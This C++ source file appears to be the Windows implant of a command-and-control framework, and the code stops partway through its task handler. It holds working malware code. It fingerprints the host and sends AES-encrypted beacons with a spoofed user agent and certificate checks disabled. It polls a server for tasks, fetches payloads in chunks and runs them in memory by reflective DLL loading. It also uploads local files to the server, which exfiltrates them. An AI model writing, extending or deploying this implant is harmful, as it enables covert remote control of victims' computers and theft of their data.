#define no_init_all deprecated
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <iostream>
#include <vector>
#include <string>
#include <sstream>
#include <strsafe.h>
#include <codecvt>
#include <locale>
#include <TlHelp32.h>
#include <fstream>
#include "json.hpp"
#include "Base64.h"
#include "config.h"
#pragma comment(lib, "wininet.lib")
#include <regex>
#include <cstdio>
#include <cstdlib>
#include <time.h>
#include <stdlib.h>
#include <chrono>
#include <ctime>
#include <algorithm>
#include "cppcodec/base64_default_rfc4648.hpp"

#include "pch.h"
#include <iostream>
#include "aes.h"
#include <Windows.h>

#include "osrng.h"
using CryptoPP::AutoSeededRandomPool;

#include <iostream>
using std::cout;
using std::cerr;
using std::endl;

#include <string>
using std::string;

#include <cstdlib>
using std::exit;

#include "cryptlib.h"
using CryptoPP::Exception;

#include "hex.h"
using CryptoPP::HexEncoder;
using CryptoPP::HexDecoder;

#include "filters.h"
using CryptoPP::StringSink;
using CryptoPP::StringSource;
using CryptoPP::StreamTransformationFilter;

#include "aes.h"
using CryptoPP::AES;

#include "ccm.h"
using CryptoPP::CBC_Mode;

#include "assert.h"
using CryptoPP::byte;

typedef UINT_PTR(WINAPI *RDI)();
//typedef LPWSTR(WINAPI *FunctionW)(LPCWSTR, DWORD);
typedef LPWSTR(__cdecl * FUNCTIONW)(LPCWSTR, DWORD);
typedef LPWSTR(__cdecl * FUNCTIONWMimi)(LPCWSTR);
typedef LPBYTE(*ExecuteWFunc)(LPCWSTR, DWORD*);
// RVA = Relative Virtual Address
#define RVA(type, base, rva) (type)((ULONG_PTR)base + rva)
//#pragma warning(disable: 426)
#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable: 4996)

#define CHUNK_SIZE 1048576
int jitterPercentage = 25;
using json = nlohmann::json;

byte key[AES::DEFAULT_KEYLENGTH] = {
	0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
	0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F
};

byte iv[AES::BLOCKSIZE] = {
	0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
	0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F
};

string AESEncrypt(const string& plain)
{
	try
	{
		string cipher;

		CBC_Mode<AES>::Encryption e;
		e.SetKeyWithIV(key, AES::DEFAULT_KEYLENGTH, iv);

		StringSource s(plain, true,
			new StreamTransformationFilter(e,
				new StringSink(cipher)
			)
		);

		return cipher;
	}
	catch (const CryptoPP::Exception& e)
	{
		cerr << e.what() << endl;
		exit(1);
	}
}

DWORD GetCurrentProcessIntegrityLevel() {
	HANDLE hToken;
	HANDLE hProcess;

	DWORD dwLengthNeeded;
	DWORD dwError = ERROR_SUCCESS;

	PTOKEN_MANDATORY_LABEL pTIL = NULL;
//	LPWSTR pStringSid;
	DWORD dwIntegrityLevel;

	hProcess = GetCurrentProcess(); // Get current process handle
	// Get Process Token for current process
	if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
		// Getting integrity level
		// First handle any errors and get the value of dwLengthNeeded
		if (!GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &dwLengthNeeded)) {
			dwError = GetLastError();
			if (dwError == ERROR_INSUFFICIENT_BUFFER) {
				pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, dwLengthNeeded);
				if (pTIL != NULL) {
					// Now we get the integrity level
					if (GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, dwLengthNeeded, &dwLengthNeeded)) {
						dwIntegrityLevel = *GetSidSubAuthority(pTIL->Label.Sid, (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));
						if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID) {
							return 1; // Integrity Level = 1 ; Low Authority
						}
						else if (dwIntegrityLevel == SECURITY_MANDATORY_MEDIUM_RID) {
							return 3; // Integrity Level = 3 ; Medium Authority
						}
						else if (dwIntegrityLevel == SECURITY_MANDATORY_HIGH_RID) {
							return 4; // Integrity Level = 4 ; High Authority
						}
						else if (dwIntegrityLevel == SECURITY_MANDATORY_SYSTEM_RID) {
							return 5; // Integrity Level = 5 ; SYSTEM Authority
						}
					}
					LocalFree(pTIL);
				}
			}
		}
		CloseHandle(hToken);
	}
}

HKEY regOpenKey(HKEY hKey, LPCTSTR subKey, REGSAM dPriv)
{
	HKEY rHandle;
	if (RegOpenKeyEx(hKey, subKey, 0, dPriv, &rHandle) == ERROR_SUCCESS)
	{
		return rHandle;
	}
	else
	{
		return NULL;
	}
}

// returns string-only registry value
std::wstring regQueryValue(HKEY hKey, LPCTSTR valueName)
{
	wchar_t data[255] = L"";
	DWORD dataSize = 255;

	if (RegQueryValueEx(hKey, valueName, NULL, NULL, (LPBYTE)data, &dataSize) == ERROR_SUCCESS)
	{
		return data;
	}
	else
	{
		return L"";
	}
}

std::wstring getmachineGUID()
{
	std::wstring subkey = L"SOFTWARE\\Microsoft\\Cryptography";
	std::wstring name = L"MachineGuid";
	std::wstring value = L"";

	HKEY hKey = 0;
	wchar_t buf[255];
	DWORD dwBufSize = sizeof(buf);

	// KEY_WOW64_64KEY allows this to work when we compile a x86 version on a x64 system.
	//
	// first arg is the HIVE we want to connect too.
	// second arg is the subkey LPCSTR
	//
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.c_str(), 0, KEY_QUERY_VALUE | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS)
	{
		// first arg is the key from RegOpenKeyExW
		// second arg is the name of the item we want
		if (RegQueryValueExW(hKey, name.c_str(), 0, 0, (BYTE*)buf, &dwBufSize) == ERROR_SUCCESS)
		{
			value = buf;
		}
	}
	else
	{	
		COUT("Can not open guidkey!\n");
		exit(0);
		
	}

	return value;
}

BOOL http_request(LPCSTR host, WORD port, BOOL secure, LPCSTR verb, LPCSTR path, LPCSTR szHeaders, SIZE_T nHeaderSize,
	LPCSTR postData, SIZE_T nPostDataSize, std::string* agentid)
{
	HINTERNET hIntSession = NULL;
	HINTERNET hHttpSession = NULL;
	HINTERNET hHttpRequest = NULL;
	DWORD dwFlags = 0;
	BOOL ret = FALSE;


	do
	{
		// TODO 1
		hIntSession = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
		if (hIntSession == NULL)
		{
			break;
		}

		// TODO 2
		hHttpSession = InternetConnectA(hIntSession, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)NULL);
		if (hHttpSession == NULL)
		{
			break;
		}

		dwFlags = INTERNET_FLAG_RELOAD
			| INTERNET_FLAG_DONT_CACHE
			| INTERNET_FLAG_NO_UI
			| INTERNET_FLAG_KEEP_CONNECTION;

		if (secure)
		{
			dwFlags |= INTERNET_FLAG_SECURE;
		}

		// TODO 3
		hHttpRequest = HttpOpenRequestA(hHttpSession, verb, path, 0, 0, 0, dwFlags, 0);
		if (hHttpRequest == NULL)
		{
			break;
		}

		if (secure)
		{
			auto certOptions = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
				SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
				SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
				SECURITY_FLAG_IGNORE_REVOCATION;
			auto modSucess = InternetSetOptionA(hHttpRequest, INTERNET_OPTION_SECURITY_FLAGS, &certOptions, sizeof(certOptions));
		}

		json payload;
		json j, k;
		j["os"] = "Windows";
		std::wstring machineguid = getmachineGUID();
		std::string guid(machineguid.begin(), machineguid.end());
		j["machine_guid"] = guid;
		j["username"] = "user";
		j["hostname"] = "win";
		j["internal_ip"] = "1.1.1.1";
		j["external_ip"] = "0.0.0.0";
		j["integrity"] = GetCurrentProcessIntegrityLevel();
		j["process_arch"] = 1;

		std::string encoded;
		std::string encoded1;
		Base64Encode(j.dump(), &encoded);
		k["data"] = encoded;
		k["ht"] = 1;
		Base64Encode(k.dump(), &encoded1);
	
		string cipher = AESEncrypt(encoded1);
		string cipher_encoded;
		StringSource(cipher, true,
			new HexEncoder(
				new StringSink(cipher_encoded)
			) // HexEncoder
		);
		encoded.clear();
		Base64Encode(cipher_encoded, &encoded);
		payload["d"] = encoded;
		std::string postDataStr = payload.dump();
		postData = postDataStr.c_str();
		nPostDataSize = postDataStr.size();
		szHeaders = "Content-Type: application/json";
		nHeaderSize = strlen("Content-Type: application/json");

		if (!HttpSendRequestA(hHttpRequest, szHeaders, nHeaderSize, (LPVOID)postData, nPostDataSize))
		{
			break;
		}

		CHAR szBuffer[1024];
		CHAR *output = (CHAR*)malloc(1024);
		DWORD dwRead = 0;
		DWORD dwTotalBytes = 0;
		memset(output, 0, 1024);
		memset(szBuffer, 0, sizeof(szBuffer));

		while (InternetReadFile(hHttpRequest, szBuffer, sizeof(szBuffer) - 1, &dwRead) && dwRead)
		{
			DWORD dwOffset = dwTotalBytes;
			dwTotalBytes += dwRead;

			output = (CHAR*)realloc(output, dwTotalBytes);
			memcpy(output + dwOffset, szBuffer, dwRead);

			memset(szBuffer, 0, sizeof(szBuffer));
			dwRead = 0;
		}

		output[dwTotalBytes] = '\0';
		json response = json::parse(output);
		std::string message = response["data"];
		std::string decoded_result;
		Base64Decode(message, &decoded_result);
		json res = json::parse(decoded_result);
		*agentid = res["agent_id"];
		COUT(*agentid);
		COUT("\n");


		ret = TRUE;
	} while (0);

	if (hHttpRequest)
	{
		InternetCloseHandle(hHttpRequest);
	}

	if (hHttpSession)
	{
		InternetCloseHandle(hHttpSession);
	}

	if (hIntSession)
	{
		InternetCloseHandle(hIntSession);
	}

	return ret;
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

//download file request
BOOL http_request_downloadFile(LPCSTR host, WORD port, BOOL secure, LPCSTR verb, LPCSTR path, LPCSTR szHeaders, SIZE_T nHeaderSize,
	LPCSTR postData, SIZE_T nPostDataSize, char **data, LPDWORD dwDataSize, const std::string& fileId, CHAR* szBuffer, const std::string& taskId)
{
	HINTERNET hIntSession = NULL;
	HINTERNET hHttpSession = NULL;
	HINTERNET hHttpRequest = NULL;
	DWORD dwFlags = 0;
	int total = 0;
	BOOL ret = FALSE;
	int i = 1;
	std::string result;
	do
	{
		// TODO 1
		hIntSession = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
		if (hIntSession == NULL)
		{
			break;
		}

		// TODO 2
		hHttpSession = InternetConnectA(hIntSession, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)NULL);
		if (hHttpSession == NULL)
		{
			break;
		}

		dwFlags = INTERNET_FLAG_RELOAD
			| INTERNET_FLAG_DONT_CACHE
			| INTERNET_FLAG_NO_UI
			| INTERNET_FLAG_KEEP_CONNECTION;

		if (secure)
		{
			dwFlags |= INTERNET_FLAG_SECURE;
		}

		// TODO 3
		hHttpRequest = HttpOpenRequestA(hHttpSession, verb, path, 0, 0, 0, dwFlags, 0);
		if (hHttpRequest == NULL)
		{
			break;
		}

		if (secure)
		{
			auto certOptions = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
				SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
				SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
				SECURITY_FLAG_IGNORE_REVOCATION;
			auto modSucess = InternetSetOptionA(hHttpRequest, INTERNET_OPTION_SECURITY_FLAGS, &certOptions, sizeof(certOptions));
		}

		json payload;
		json j, k;
		if (i == 1)
		{
			j["task_id"] = taskId;
			j["file_id"] = fileId;
			k["ht"] = 7;
		}
		else
		{
			j["chunk_id"] = i;
			j["file_id"] = fileId;
			k["ht"] = 8;
		}
		std::string encoded;
		std::string encoded1;
		Base64Encode(j.dump(), &encoded);
		k["data"] = encoded;
		Base64Encode(k.dump(), &encoded1);

		string cipher = AESEncrypt(encoded1);
		string cipher_encoded;
		StringSource(cipher, true,
			new HexEncoder(
				new StringSink(cipher_encoded)
			) // HexEncoder
		);
		encoded.clear();
		Base64Encode(cipher_encoded, &encoded);
		payload["d"] = encoded;

		std::string postDataStr = payload.dump();
		postData = postDataStr.c_str();
		nPostDataSize = postDataStr.size();
		szHeaders = "Content-Type: application/json";
		nHeaderSize = strlen("Content-Type: application/json");

		if (!HttpSendRequestA(hHttpRequest, szHeaders, nHeaderSize, (LPVOID)postData, nPostDataSize))
		{
			break;
		}

		CHAR *output = (CHAR*)malloc(1024);
		DWORD dwRead = 0;
		DWORD dwTotalBytes = 0;

		memset(output, 0, 1024);
		memset(szBuffer, 0, sizeof(szBuffer));

		while (InternetReadFile(hHttpRequest, szBuffer, sizeof(szBuffer) - 1, &dwRead) && dwRead)
		{
			DWORD dwOffset = dwTotalBytes;
			dwTotalBytes += dwRead;

			output = (CHAR*)realloc(output, dwTotalBytes);
			memcpy(output + dwOffset, szBuffer, dwRead);

			memset(szBuffer, 0, sizeof(szBuffer));
			dwRead = 0;
		}

		output[dwTotalBytes] = '\0';

		json response = json::parse(output);
		std::string message = response["message"];
		std::string chunk = response["chunk"];
		int nextChunkId = response["next_chunk_id"];
		if (i == 1) { total = response["total"]; }
		COUT("[+] next chunk id = ");
		COUT (nextChunkId);
		COUT("\n");

		i = nextChunkId;
		std::string decoded_result;
		Base64Decode(chunk, &decoded_result);
		result.append(decoded_result);

		total = total - 1;
		COUT("[+] total chunks remaining = ");
		COUT(total);
		COUT("\n");
		COUT("[+] value of i = ");
		COUT(i);
		COUT("\n");
		ret = TRUE;
	} while (total > 0);

	if (hHttpRequest)
	{
		InternetCloseHandle(hHttpRequest);
	}

	if (hHttpSession)
	{
		InternetCloseHandle(hHttpSession);
	}

	if (hIntSession)
	{
		InternetCloseHandle(hIntSession);
	}
	DWORD dataSize = result.size();
	*data = new char[dataSize + 1];
	memcpy(*data, result.c_str(), dataSize);
	(*data)[dataSize] = '\0';
	*dwDataSize = result.size();
	COUT(result.size());
	COUT("\n");
	return ret;
}

FARPROC GetProcAddressR(HMODULE hModule, LPCSTR lpProcName)
{
	if (hModule == NULL || lpProcName == NULL)
		return NULL;

	PIMAGE_NT_HEADERS ntHeaders = RVA(PIMAGE_NT_HEADERS, hModule, ((PIMAGE_DOS_HEADER)hModule)->e_lfanew);
	PIMAGE_DATA_DIRECTORY dataDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	if (!dataDir->Size)
		return NULL;

	PIMAGE_EXPORT_DIRECTORY exportDir = RVA(PIMAGE_EXPORT_DIRECTORY, hModule, dataDir->VirtualAddress);
	if (!exportDir->NumberOfNames || !exportDir->NumberOfFunctions)
		return NULL;

	PDWORD expName = RVA(PDWORD, hModule, exportDir->AddressOfNames);
	PWORD expOrdinal = RVA(PWORD, hModule, exportDir->AddressOfNameOrdinals);
	LPCSTR expNameStr;

	for (DWORD i = 0; i < exportDir->NumberOfNames; i++, expName++, expOrdinal++) {

		expNameStr = RVA(LPCSTR, hModule, *expName);

		if (!expNameStr)
			break;

		if (!_stricmp(lpProcName, expNameStr)) {
			DWORD funcRva = *RVA(PDWORD, hModule, exportDir->AddressOfFunctions + (*expOrdinal * 4));
			return RVA(FARPROC, hModule, funcRva);
		}
	}

	return NULL;
}


std::string GetProcessArchitecture(DWORD processId) {
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processId);
	if (hProcess != NULL) {
		BOOL isWow64Process = FALSE;
		if (IsWow64Process(hProcess, &isWow64Process) && isWow64Process) {
			CloseHandle(hProcess);
			return "x86";
		}
		CloseHandle(hProcess);
		return "x64";
	}
	return "Unknown";
}

std::string GetProcessOwner(DWORD pid) {
	std::string user = "";

	HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
	HANDLE tokenHandle = NULL;

	if (!OpenProcessToken(processHandle, TOKEN_QUERY, &tokenHandle)) {
		user = "Failed to retrieve process token!";
	}
	else {
		DWORD returnLength = 0;
		GetTokenInformation(tokenHandle, TokenUser, NULL, 0, &returnLength);

		if (returnLength > 0) {
			BYTE* tokenInformation = new BYTE[returnLength];

			if (GetTokenInformation(tokenHandle, TokenUser, tokenInformation, returnLength, &returnLength)) {
				TOKEN_USER* processUser = reinterpret_cast<TOKEN_USER*>(tokenInformation);
				PSID processSID = processUser->User.Sid;
				SID_NAME_USE sidNameUse;
				DWORD usernameSize = 256;
				DWORD domainSize = 256;
				char username[256] = { 0 };
				char domain[256] = { 0 };

				if (LookupAccountSid(NULL, processSID, username, &usernameSize, domain, &domainSize, &sidNameUse)) {
					user = username;
				}
				else {
					user = "Failed to lookup account SID!";
				}
			}
			else {
				user = "Failed to retrieve token information!";
			}

			delete[] tokenInformation;
		}
		else {
			user = "No token information available!";
		}

		CloseHandle(tokenHandle);
	}

	CloseHandle(processHandle);

	return user;
}


BOOL loadDll(char **data, HMODULE* hModule)
{
	LPSTR finalShellcode = NULL;
//	DWORD finalSize;
	DWORD dwOldProtect1 = 0;
	SYSTEM_INFO sysInfo;
	finalShellcode = *data;
	//finalSize = dwDataSize;
	
	GetNativeSystemInfo(&sysInfo);

	// Only set the first page to RWX
	// This is should sufficiently cover the sRDI shellcode up top
	if (VirtualProtect(finalShellcode, sysInfo.dwPageSize, PAGE_EXECUTE_READWRITE, &dwOldProtect1))
	{
		RDI rdi = (RDI)(finalShellcode);
#ifdef _DEBUG
		printf("[+] Loaded DLL...\n");
#endif
		HMODULE hLoadedDLL = (HMODULE)rdi(); // Execute DLL
		free(finalShellcode); // Free the RDI blob. We no longer need it.
		*hModule = hLoadedDLL;


		return TRUE;
	}

	return FALSE;
}


BOOL http_request_upload(LPCSTR host, WORD port, BOOL secure, LPCSTR verb, LPCSTR path, LPCSTR szHeaders, SIZE_T nHeaderSize,
	LPCSTR postData, SIZE_T nPostDataSize, char **chunks, const std::string& taskId, const std::string& input, DWORD total, CHAR* szBuffer, size_t lastchunk)
{
	HINTERNET hIntSession = NULL;
	HINTERNET hHttpSession = NULL;
	HINTERNET hHttpRequest = NULL;
	DWORD dwFlags = 0;
	BOOL ret = FALSE;
	int i = 0;
	std::string fileId;
	std::string result;
	do
	{
		// TODO 1
		hIntSession = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
		if (hIntSession == NULL)
		{
			break;
		}

		// TODO 2
		hHttpSession = InternetConnectA(hIntSession, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)NULL);
		if (hHttpSession == NULL)
		{
			break;
		}

		dwFlags = INTERNET_FLAG_RELOAD
			| INTERNET_FLAG_DONT_CACHE
			| INTERNET_FLAG_NO_UI
			| INTERNET_FLAG_KEEP_CONNECTION;

		if (secure)
		{
			dwFlags |= INTERNET_FLAG_SECURE;
		}

		// TODO 3
		hHttpRequest = HttpOpenRequestA(hHttpSession, verb, path, 0, 0, 0, dwFlags, 0);
		if (hHttpRequest == NULL)
		{
			break;
		}

		if (secure)
		{
			auto certOptions = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
				SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
				SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | 



				SECURITY_FLAG_IGNORE_REVOCATION;
			auto modSucess = InternetSetOptionA(hHttpRequest, INTERNET_OPTION_SECURITY_FLAGS, &certOptions, sizeof(certOptions));
		}

		json payload;
		json j, k;
		if (i == 0)
		{
			j["task_id"] = taskId;
			j["path"] = input;
			k["ht"] = 4;
		}
		else
		{
			//j["content"] = chunks[i];
			j["file_id"] = fileId;
			k["ht"] = 5;
		}
		std::string base64Encoded;
		if (i == (total - 1))
		{
			base64Encoded = cppcodec::base64_rfc4648::encode(chunks[i], lastchunk);
		}
		else {
			base64Encoded = cppcodec::base64_rfc4648::encode(chunks[i], CHUNK_SIZE);
		}
		j["content"] = base64Encoded;
		std::string encoded;
		std::string encoded1;
		Base64Encode(j.dump(), &encoded);
		k["data"] = encoded;
		Base64Encode(k.dump(), &encoded1);

		string cipher = AESEncrypt(encoded1);
		string cipher_encoded;
		StringSource(cipher, true,
			new HexEncoder(
				new StringSink(cipher_encoded)
			) // HexEncoder
		);
		encoded.clear();
		Base64Encode(cipher_encoded, &encoded);
		payload["d"] = encoded;

		std::string postDataStr = payload.dump();
		postData = postDataStr.c_str();
		nPostDataSize = postDataStr.size();
		szHeaders = "Content-Type: application/json";
		nHeaderSize = strlen("Content-Type: application/json");

		if (!HttpSendRequestA(hHttpRequest, szHeaders, nHeaderSize, (LPVOID)postData, nPostDataSize))
		{
			break;
		}

		CHAR *output = (CHAR*)malloc(1024);
		DWORD dwRead = 0;
		DWORD dwTotalBytes = 0;

		memset(output, 0, 1024);
		memset(szBuffer, 0, sizeof(szBuffer));

		while (InternetReadFile(hHttpRequest, szBuffer, sizeof(szBuffer) - 1, &dwRead) && dwRead)
		{
			DWORD dwOffset = dwTotalBytes;
			dwTotalBytes += dwRead;

			output = (CHAR*)realloc(output, dwTotalBytes);
			memcpy(output + dwOffset, szBuffer, dwRead);

			memset(szBuffer, 0, sizeof(szBuffer));
			dwRead = 0;
		}

		output[dwTotalBytes] = '\0';

		json response = json::parse(output);
		std::string message = response["message"];
		std::cout << response << std::endl;
		if (i == 0) { fileId = response["id"]; }
		++i;
		total = total - 1;
		COUT("[+] total chunks remaining = ");
		COUT(total);
		COUT("\n");
		COUT("[+] \value of i = ");
		COUT(i);
		COUT("\n");
		ret = TRUE;
	} while (total > 0);

	if (hHttpRequest)
	{
		InternetCloseHandle(hHttpRequest);
	}

	if (hHttpSession)
	{
		InternetCloseHandle(hHttpSession);
	}

	if (hIntSession)
	{
		InternetCloseHandle(hIntSession);
	}
	
	return ret;
}


BOOL http_request_uploadEnd(LPCSTR host, WORD port, BOOL secure, LPCSTR verb, LPCSTR path, LPCSTR szHeaders, SIZE_T nHeaderSize,
	LPCSTR postData, SIZE_T nPostDataSize, const std::string& taskId, const std::string& agentId, const std::string result, int status, CHAR* szBuffer)
{
	HINTERNET hIntSession = NULL;
	HINTERNET hHttpSession = NULL;
	HINTERNET hHttpRequest = NULL;
	DWORD dwFlags = 0;
	BOOL ret = FALSE;

	do
	{
		// TODO 1
		hIntSession = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
		if (hIntSession == NULL)
		{
			break;
		}

		// TODO 2
		hHttpSession = InternetConnectA(hIntSession, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)NULL);
		if (hHttpSession == NULL)
		{
			break;
		}

		dwFlags = INTERNET_FLAG_RELOAD
			| INTERNET_FLAG_DONT_CACHE
			| INTERNET_FLAG_NO_UI
			| INTERNET_FLAG_KEEP_CONNECTION;

		if (secure)
		{
			dwFlags |= INTERNET_FLAG_SECURE;
		}

		// TODO 3
		hHttpRequest = HttpOpenRequestA(hHttpSession, verb, path, 0, 0, 0, dwFlags, 0);
		if (hHttpRequest == NULL)
		{
			break;
		}

		if (secure)
		{
			auto certOptions = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
				SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
				SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |



				SECURITY_FLAG_IGNORE_REVOCATION;
			auto modSucess = InternetSetOptionA(hHttpRequest, INTERNET_OPTION_SECURITY_FLAGS, &certOptions, sizeof(certOptions));
		}

		json payload;
		json j, k;
		
		j["task_id"] = taskId;
		j["status"] = status;
		j["agent_id"] = agentId;
		j["result"] = result;
		k["ht"] = 6;
	
		std::string encoded;
		std::string encoded1;

		Base64Encode(j.dump(), &encoded);
		k["data"] = encoded;
		Base64Encode(k.dump(), &encoded1);

		string cipher = AESEncrypt(encoded1);
		string cipher_encoded;
		StringSource(cipher, true,
			new HexEncoder(
				new StringSink(cipher_encoded)
			) // HexEncoder
		);
		encoded.clear();
		Base64Encode(cipher_encoded, &encoded);
		payload["d"] = encoded;

		std::string postDataStr = payload.dump();
		postData = postDataStr.c_str();
		nPostDataSize = postDataStr.size();
		szHeaders = "Content-Type: application/json";
		nHeaderSize = strlen("Content-Type: application/json");

		if (!HttpSendRequestA(hHttpRequest, szHeaders, nHeaderSize, (LPVOID)postData, nPostDataSize))
		{
			break;
		}

		//		CHAR szBuffer[1024];
		CHAR *output = (CHAR*)malloc(1024);
		DWORD dwRead = 0;
		DWORD dwTotalBytes = 0;

		memset(output, 0, 1024);
		memset(szBuffer, 0, sizeof(szBuffer));

		while (InternetReadFile(hHttpRequest, szBuffer, sizeof(szBuffer) - 1, &dwRead) && dwRead)
		{
			DWORD dwOffset = dwTotalBytes;
			dwTotalBytes += dwRead;

			output = (CHAR*)realloc(output, dwTotalBytes);
			memcpy(output + dwOffset, szBuffer, dwRead);

			memset(szBuffer, 0, sizeof(szBuffer));
			dwRead = 0;
		}

		output[dwTotalBytes] = '\0';

		json response = json::parse(output);
		COUT(response);
		COUT("\n");
		ret = TRUE;
	} while (0);

	if (hHttpRequest)
	{
		InternetCloseHandle(hHttpRequest);
	}

	if (hHttpSession)
	{
		InternetCloseHandle(hHttpSession);
	}

	if (hIntSession)
	{
		InternetCloseHandle(hIntSession);
	}

	return ret;
}


BOOL http_request_task(LPCSTR host, WORD port, BOOL secure, LPCSTR verb, LPCSTR path, LPCSTR szHeaders, SIZE_T nHeaderSize,
	LPCSTR postData, SIZE_T nPostDataSize, std::string* agentid, json* taskresult, int* flag)
{
	HINTERNET hIntSession = NULL;
	HINTERNET hHttpSession = NULL;
	HINTERNET hHttpRequest = NULL;
	DWORD dwFlags = 0;
	BOOL ret = FALSE;

	do
	{
		// TODO 1
		hIntSession = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
		if (hIntSession == NULL)
		{
			break;
		}

		// TODO 2
		hHttpSession = InternetConnectA(hIntSession, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)NULL);
		if (hHttpSession == NULL)
		{
			break;
		}

		dwFlags = INTERNET_FLAG_RELOAD
			| INTERNET_FLAG_DONT_CACHE
			| INTERNET_FLAG_NO_UI
			| INTERNET_FLAG_KEEP_CONNECTION;

		if (secure)
		{
			dwFlags |= INTERNET_FLAG_SECURE;
		}

		// TODO 3
		hHttpRequest = HttpOpenRequestA(hHttpSession, verb, path, 0, 0, 0, dwFlags, 0);
		if (hHttpRequest == NULL)
		{
			break;
		}

		if (secure)
		{
			auto certOptions = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
				SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
				SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
				SECURITY_FLAG_IGNORE_REVOCATION;
			auto modSucess = InternetSetOptionA(hHttpRequest, INTERNET_OPTION_SECURITY_FLAGS, &certOptions, sizeof(certOptions));
		}

		json payload;
		json j, k;
		j["agent_id"] = *agentid;

		std::string encoded;
		std::string encoded1;
		Base64Encode(j.dump(), &encoded);
		k["data"] = encoded;
		k["ht"] = 2;
		Base64Encode(k.dump(), &encoded1);

		string cipher = AESEncrypt(encoded1);
		string cipher_encoded;
		StringSource(cipher, true,
			new HexEncoder(
				new StringSink(cipher_encoded)
			) // HexEncoder
		);
		encoded.clear();
		Base64Encode(cipher_encoded, &encoded);
		payload["d"] = encoded;

		std::string postDataStr = payload.dump();
		postData = postDataStr.c_str();
		nPostDataSize = postDataStr.size();
		szHeaders = "Content-Type: application/json";
		nHeaderSize = strlen("Content-Type: application/json");

		if (!HttpSendRequestA(hHttpRequest, szHeaders, nHeaderSize, (LPVOID)postData, nPostDataSize))
		{
			break;
		}

		CHAR szBuffer[1024];
		CHAR *output = (CHAR*)malloc(1024);
		DWORD dwRead = 0;
		DWORD dwTotalBytes = 0;
		memset(output, 0, 1024);
		memset(szBuffer, 0, sizeof(szBuffer));

		while (InternetReadFile(hHttpRequest, szBuffer, sizeof(szBuffer) - 1, &dwRead) && dwRead)
		{
			DWORD dwOffset = dwTotalBytes;
			dwTotalBytes += dwRead;

			output = (CHAR*)realloc(output, dwTotalBytes);
			memcpy(output + dwOffset, szBuffer, dwRead);

			memset(szBuffer, 0, sizeof(szBuffer));
			dwRead = 0;
		}

		output[dwTotalBytes] = '\0';
		json response = json::parse(output);
		if (response.size() < 1)
		{
			COUT("[!] No Task Assigned ");
			COUT("\n");
			break;
		}
		std::string message = response["data"];
		std::string decoded_result;
		Base64Decode(message, &decoded_result);
		json res = json::parse(decoded_result);
		COUT(res);
		COUT("\n");
		std::string input = res["input"];
		int type = res["type"].get<int>();
		int status = res["status"].get<int>();
		json taskresultcopy;    //ye copy result h 
		taskresultcopy["id"] = res["id"];
		taskresultcopy["agent_id"] = *agentid;


		if (type == 1) {
			*flag = 1;
			break;
		}
		else if (type == 4) {
			if (SetCurrentDirectoryA(input.c_str()))
			{
				COUT("[+] Directory ");
				COUT(input.c_str());
				COUT("\n");
